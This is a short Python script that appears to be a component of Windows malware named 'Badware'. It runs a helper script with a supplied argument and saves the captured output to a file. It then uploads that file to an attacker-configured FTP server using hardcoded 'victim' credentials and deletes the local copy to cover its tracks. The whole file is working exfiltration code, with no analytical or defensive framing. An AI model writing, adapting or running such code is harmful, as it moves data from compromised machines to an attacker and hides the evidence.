import sys
import subprocess
import ftplib
import os
username = os.getlogin()
with open(fr"C:\users\{username}\AppData\Local\Aryan\Badware\ftpserver", "r") as servername:
	server = servername.read()
result = subprocess.run([fr'C:\users\{username}\AppData\local\Aryan\Badware\py\WPy64-31090\python-3.10.9.amd64\python.exe', 'open1.py', sys.argv[1]], stdout=subprocess.PIPE)
if os.path.isfile(fr'C:\users\{username}\AppData\local\Aryan\Badware\openresult.txt'):
    os.remove(fr'C:\users\{username}\AppData\local\Aryan\Badware\openresult.txt')
with open(fr'C:\users\{username}\AppData\local\Aryan\Badware\openresult.txt', "x") as res:
    res.write(result.stdout.decode("UTF-8"))
session = ftplib.FTP(server,'victim','victimpass1234')
with open(fr'C:\users\{username}\AppData\local\Aryan\Badware\openresult.txt', 'rb') as result:
    session.storbinary('STOR openresult.txt', result)
session.quit()
os.remove(fr'C:\users\{username}\AppData\local\Aryan\Badware\openresult.txt')
